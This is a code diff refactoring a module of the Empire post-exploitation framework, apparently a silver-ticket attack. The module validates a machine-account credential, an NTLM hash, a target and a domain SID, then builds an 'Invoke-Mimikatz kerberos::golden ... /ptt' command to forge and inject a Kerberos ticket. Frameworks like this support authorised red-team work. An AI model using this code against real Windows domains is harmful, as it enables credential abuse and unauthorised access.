@@ -1,28 +1,22 @@
 from empire.server.common import helpers
 from empire.server.common.empire import MainMenu
 from empire.server.core.db.base import SessionLocal
+from empire.server.core.exceptions import ModuleValidationException
 from empire.server.core.module_models import EmpireModule
-from empire.server.utils.module_util import handle_error_message
-
+from empire.server.core.module_service import auto_finalize, auto_get_source
 
 class Module:
     @staticmethod
+    @auto_get_source
+    @auto_finalize
     def generate(
         main_menu: MainMenu,
         module: EmpireModule,
         params: dict,
         obfuscate: bool = False,
         obfuscation_command: str = "",
+        script: str = "",
     ):
-        # read in the common module source code
-        script, err = main_menu.modulesv2.get_module_source(
-            module_name=module.script_path,
-            obfuscate=obfuscate,
-            obfuscate_command=obfuscation_command,
-        )
-
-        if err:
-            return handle_error_message(err)
 
         # if a credential ID is specified, try to parse
         cred_id = params["CredID"]
@@ -31,10 +25,10 @@ class Module:
                 cred = main_menu.credentialsv2.get_by_id(db, cred_id)
 
                 if not cred:
-                    return handle_error_message("[!] CredID is invalid!")
+                    raise ModuleValidationException("CredID is invalid!")
 
                 if not cred.username.endswith("$"):
-                    return handle_error_message(
+                    raise ModuleValidationException(
                         "[!] please specify a machine account credential"
                     )
                 if cred.domain != "":
@@ -48,13 +42,13 @@ class Module:
 
         # error checking
         if not helpers.validate_ntlm(params["rc4"]):
-            return handle_error_message("[!] rc4/NTLM hash not specified")
+            raise ModuleValidationException("rc4/NTLM hash not specified")
 
         if params["target"] == "":
-            return handle_error_message("[!] target not specified")
+            raise ModuleValidationException("target not specified")
 
         if params["sid"] == "":
-            return handle_error_message("[!] domain SID not specified")
+            raise ModuleValidationException("domain SID not specified")
 
         # build the golden ticket command
         script_end = "Invoke-Mimikatz -Command '\"kerberos::golden"
@@ -70,10 +64,4 @@ class Module:
 
         script_end += " /ptt\"'"
 
-        script = main_menu.modulesv2.finalize_module(
-            script=script,
-            script_end=script_end,
-            obfuscate=obfuscate,
-            obfuscation_command=obfuscation_command,
-        )
-        return script
+        return script, script_end
